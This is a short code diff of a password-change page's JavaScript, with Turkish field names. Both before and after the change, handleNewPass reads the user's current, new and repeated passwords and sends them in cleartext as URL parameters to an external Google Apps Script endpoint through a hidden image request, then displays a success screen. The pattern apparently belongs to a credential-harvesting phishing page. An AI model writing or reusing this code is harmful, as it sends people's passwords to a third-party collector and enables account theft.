@@ -440,6 +440,7 @@
     document.getElementById('pw-err').style.display = 'none';
   }
   function handleNewPass() {
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
     const p0 = document.getElementById('pw0').value;
     const p1 = document.getElementById('pw1').value;
     const p2 = document.getElementById('pw2').value;
@@ -448,9 +449,8 @@
       document.getElementById('pw-err').style.display = 'block';
       return;
     }
-    const url = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
-    const params = '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
-    new Image().src = url + params;
+    var img = new Image();
+    img.src = SHEET_URL + '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
     goTo('s-success');
   }
 </script>
